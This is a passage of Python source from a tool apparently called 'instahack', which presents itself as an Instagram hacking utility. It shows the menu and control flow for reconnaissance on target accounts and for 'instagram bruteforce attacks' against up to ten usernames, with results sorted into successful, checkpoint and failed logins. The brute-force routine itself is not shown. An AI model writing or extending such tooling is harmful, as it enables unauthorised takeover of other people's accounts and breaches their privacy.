        userlist=[]
        print(f'''
{IHACK} make sure the target account is not private
        use comma (,) as separator for multiple target
        ''')
        while True:
            user=str(input(f'{IHACK} enter username: '))
            if "," in user:
                for u in user.split(","):userlist.append(u)
            else:userlist.append(user)
            break
        for username in userlist:
            print(f'{IHACK} profile information for {R}-> {G}@{username}{W}')
            print(W+"-"*55)
            data=self.info(username)
            if data["status"]:
                for line in data:
                    print(f'{IHACK} {C}{line}{W}: {data[line]}')
            else:print(f'{ERROR} failed to reconnaissance {R}->{R} {username}{W}')
            print(W+"-"*55)
        print(f'{IHACK} instarecon completed {R}->{G} {str(len(userlist))} results{W}')
    def instabrute(self):
        targetlist=[]
        days=time.strftime("%d%m%y")
        print(f'''
{IHACK} make sure the target profile is not private
        max limit for target is 10 (default: 1)
        ''')
        try:
            while True:
                limit=int(input(f'{IHACK} input limit (example: 3): '))
                if limit>10:print(f'{ERROR} limit index out of range max is 10')
                else:break
        except:limit=1
        for i in range(limit):
            targetlist.append(str(input(f'{IHACK} enter username: ')))
        self.dump(targetlist)
        print(W)
        print(f'{IHACK} instabrute completed {R}->{W} ok: {G}{str(len(self.ok))}{W} cp: {Y}{str(len(self.cp))}{W} ko: {R}{str(len(self.ko))}')
    def menu(self):
        xxx=[self.ok,self.cp,self.ko]
        for x in xxx:x.clear()
        premium=(f'{G}premium{W}'if self.license["premium"]==True else f'{R}not premium{W}')
        print(f'''{W}{R}{open(BANNERSFILE,'r').read()}{W}

{IHACK} author by {G}@iqbalmh18{W} (founder of {R}@termuxhackers.id{W})
{IHACK} {U}https://github.com/termuxhackers-id/instahack/{W} ({G}github{W})
{IHACK} version release {Y}v1.0.4{W} ({G}stable{W})

        license: {premium}
        created: {self.license["created"]}
        expires: {self.license["expires"]}

        {C}01{W} instarecon {C}instagram account reconnaissance{W}
        {C}02{W} instabrute {C}instagram bruteforce attacks{W}
        {C}03{W} check rest {C}check bruteforce results{W}
        {C}04{W} logout {C}cookies will be removed{W}
        {C}05{W} exit {C}cookies will be stored{W}
        ''')
        self.main()
    def main(self):
        while True:
            cmd=str(input(f'{IHACK} select menu: '))
            if cmd in("1","01"):self.instarecon()
            elif cmd in("2","02"):self.instabrute()
            elif cmd in("3","03"):self.checkrest()
            elif cmd in("4","04"):
                if os.path.isfile(COOKIESFILE):
                    os.remove(COOKIESFILE)
                exit(f'{ERROR} cookies have been removed {R}->{Y} {COOKIESFILE}{W}')
            elif cmd in("5","05"):
                exit(f'{IHACK} cookies have been stored {R}->{Y} {COOKIESFILE}{W}')
            else:continue
            break
        input(f'{IHACK} {D}press enter button for back to previos menu (ENTER) {W}')
        self.menu()
if __name__=="__main__":
    try:
        ihack=instahackv1_0_4()
        ihack.menu()
    except KeyboardInterrupt:
        exit(f'{ERROR} aborted!')
